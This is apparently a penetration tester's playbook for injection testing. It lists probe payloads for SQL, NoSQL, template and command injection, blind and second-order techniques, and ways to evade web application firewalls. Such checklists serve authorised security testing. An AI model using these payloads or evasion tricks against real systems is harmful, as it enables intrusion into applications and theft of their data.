# PB — Injection (SQL, NoSQL, template, command)

## Preconditions
Input reaches a parser; a stable baseline.

## Recipes

**Four-probe baseline.** `true`, `false`, syntax error, time delay. Record status, length,
body hash, and time for all four. Only then interpret.

**SQL.** `'`, `''`, `\`, `'--`, `'#`, `')--`, numeric `1 AND 1=1`, `1 AND 1=2`,
`ORDER BY 1..N` for column count, `UNION SELECT NULL,...`, `LIMIT 1 OFFSET 1`,
`LIKE '%a%'`, then DB-specific: `SLEEP(3)` (MySQL), `pg_sleep(3)` (Postgres),
`WAITFOR DELAY '0:0:3'` (MSSQL), `dbms_pipe.receive_message` (Oracle).

**NoSQL.** `{"$ne":null}`, `{"$gt":""}`, `{"$regex":"^a"}`, `{"$in":["a","b"]}`,
array-wrapped `["a"]`, `{"$where":"sleep(3000)"}`, and type juggling `{"$ne":0}`.

**Template.** `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`, `@(7*7)`,
`${7*7}${7*7}` for concat. Then engine escalation to `Runtime.exec` shapes.

**Command.** `;id`, `|id`, `||id`, `&id`, `` `id` ``, `$(id)`, `%0aid`, `\n id`.
Windows: `& whoami`, `| whoami`, `%COMSPEC%`.

**Blind.** Time-based, boolean-based on a stable branch, OAST callback in the payload.

**Second-order.** Store the payload in a profile field, then trigger an admin export or
report render. Most WAFs never see it.

## Signals
Consistent 3s+ delta across three runs; length shift only on the `false` probe; callback hit.

## Failure modes
ORM parameterization; WAF normalization (try case, comment insertion, JSON-wrapped).
